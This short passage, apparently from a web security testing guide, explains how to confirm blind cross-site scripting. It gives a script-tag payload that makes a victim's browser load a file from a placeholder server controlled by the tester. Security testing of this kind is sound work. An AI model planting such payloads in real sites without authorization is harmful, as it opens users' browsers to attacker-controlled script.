try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!
